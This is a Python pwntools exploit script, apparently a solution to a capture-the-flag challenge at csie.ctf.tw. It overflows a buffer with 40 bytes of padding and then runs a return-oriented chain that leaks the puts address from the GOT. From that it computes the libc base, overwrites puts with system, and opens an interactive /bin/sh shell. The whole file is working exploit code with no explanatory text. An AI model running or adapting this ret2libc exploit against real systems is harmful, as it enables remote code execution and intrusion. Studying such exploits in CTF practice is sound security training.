#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10131)

context.arch = 'amd64'

libc = ELF('./libc.so.6')

pop_rdi = 0x00000000004006f3
puts_got = 0x601018
puts_plt = 0x4004e0
gets_plt = 0x400510

r.recvuntil(':')
r.sendline('a' * 40 + flat([pop_rdi, puts_got, puts_plt, pop_rdi, puts_got, gets_plt, pop_rdi, puts_got + 8, puts_plt]))
r.recvuntil('\n')
puts_addr = u64(r.recvline().strip().ljust(8, '\x00'))
print hex(puts_addr)
base = puts_addr - libc.symbols['puts']
system = base + libc.symbols['system']
r.sendline(flat([system, '/bin/sh\x00']))
r.interactive()
